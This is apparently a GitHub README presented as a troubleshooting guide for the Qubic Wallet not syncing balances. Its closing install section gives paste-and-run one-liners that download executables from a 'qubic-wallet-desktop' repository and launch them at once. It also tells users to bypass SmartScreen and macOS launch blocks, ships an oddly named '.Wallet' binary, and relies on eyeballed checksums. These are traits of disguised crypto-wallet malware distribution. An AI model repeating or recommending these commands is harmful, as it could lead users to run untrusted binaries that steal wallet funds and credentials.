![Qubic Wallet not syncing balance lag](assets/banner-troubleshooting.png)

# Qubic Wallet Not Syncing: Diagnose It in the Right Order

The wallet has no sync progress bar. It has a network connection, and that changes the diagnosis.

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) - 57,942,724 B (55.3 MiB) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) - 49,066,728 B (46.8 MiB) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) - 51,287,539 B (48.9 MiB) |

Balance behaviour below is read from the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2) and its local server routes.

> A wallet that shows an old balance is not corrupt. It has not reached the network, or it is pointed at the wrong one.

Qubic Wallet does not download a copy of the chain, so there is no sync percentage to watch. It keeps a websocket connection to a node and asks for balances and transaction statuses, which means "not syncing" almost always means the connection is down, the app is on testnet, or the balance on screen was never refreshed. Fix the connection first and the displayed number follows.

<!-- ARTICLE-BODY-BEGIN -->

## Start by updating, not by waiting

Waiting is the one thing that cannot help, because there is no queue to work through. Install the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a> and open it once before changing anything else: a stale build can hold a stale endpoint, and the update is a two-minute step that removes a whole class of causes.

## Check which network you are on

Mainnet and testnet are separate switches, and the testnet connection is a plain websocket with a different address entirely. A wallet sitting on testnet will show testnet balances and appear stuck to anyone expecting mainnet numbers. Switch back to mainnet and reopen the account before you troubleshoot further.

## Test the connection, not the wallet

The app talks to a websocket endpoint over TLS. If your network blocks that port, the interface still opens and still lists your accounts, which is exactly what makes the failure look like a sync bug. Try another network, or a phone hotspot, and watch whether the balance arrives. The <a href="https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-offline-status-error.md">offline and status error guide</a> covers what each connection message means.

## When the balance still lags

A send or receive can take a moment to be reflected, and the wallet reads status rather than subscribing to updates. Force a refresh by locking and reopening the account, and if the number still disagrees with what you expect, verify the transaction itself rather than the screen, using the <a href="https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-block-explorer-verify.md">transaction check walkthrough</a>.

## Firewall, proxy and locked-down networks

A machine behind a corporate proxy or a restrictive firewall can run the wallet perfectly and still never reach the node, because the connection is refused before any wallet logic is involved. The tell is that the app opens, the interface responds, and only network-backed panels stay empty or retry.

The question is not whether the machine has internet, but whether the wallet has a path of its own. A proxy configured for web browsers is not automatically a proxy every application on the machine uses, and outbound websocket traffic is a separate rule again: a policy that allows ordinary browsing can still block it.

Neither answer is something a reinstall changes. Both are decisions made above the app, so the useful next step is the network's owner rather than the wallet's settings.

## FAQ

### Why does Qubic Wallet have no sync progress?

It is not a full-node wallet. There is no chain copy to download, only a connection to a node that answers balance and status queries.

### Why is my balance old but my transaction confirmed?

The app reads the balance when it asks, so a confirmed transaction can land before the screen refreshes. Reopen the account to force a new read.

### Does reinstalling help?

Only if the build was stale or the data directory was damaged. Update first; reinstalling the same version changes nothing about the connection.

### Can I use it behind a corporate network?

Only if outbound websocket traffic is allowed. If it is blocked, the app opens and stays empty, which looks like a sync failure.

<!-- ARTICLE-BODY-END -->

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet && ./qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Verify the download: `sha256sum wallet.zip`
3. Extract the archive.
4. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop.sha256` then `sha256sum qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet`
5. Mark the `.Wallet` file executable.
6. Run it.

### Published SHA-256 values (upload of 2026-11-22)

| File | Download-level SHA-256 |
| --- | --- |
| `qubic-wallet-desktop-v0.8.2-windows.exe` | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
| `qubic-wallet-desktop-v0.8.2-osx-arm64.zip` | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
| `qubic-wallet-desktop-v0.8.2-osx-x64.zip` | `923915b18899a03f7ba5685ec653102c74293d83aa078ffa9961db4c62990cd4` |
| `qubic-wallet-desktop-v0.8.2-linux-x64.zip` | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |

Compare the value your command prints with the row for the file you downloaded. The second check reads the `.sha256` file shipped inside the archive, which hashes the extracted `.Wallet` binary and names it `qubic-wallet-desktop`; compare the two hashes by eye rather than running the file as a checklist, because the stored name is not the extracted file name. A mismatch at either level means stop: delete the file and download again from this repository's release page.
<!-- INSTALL-END -->

## Related guides

- [Offline and status errors](https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-offline-status-error.md)
- [Balance not showing](https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-balance-not-showing.md)
- [Verify a transaction](https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-block-explorer-verify.md)
- [Network switch between mainnet and testnet](https://github.com/qubic-wallet/qubic-wallet-troubleshooting/blob/main/qubic-wallet-network-switch-mainnet-testnet.md)
- [Current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2)
